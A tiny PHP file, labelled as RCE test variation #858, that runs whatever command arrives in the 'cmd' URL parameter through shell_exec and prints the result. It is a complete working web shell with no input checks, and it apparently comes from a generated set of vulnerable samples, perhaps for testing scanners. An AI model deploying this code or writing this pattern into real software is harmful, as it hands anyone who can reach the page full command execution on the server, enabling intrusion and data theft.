<?php
// RCE test variation #858
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>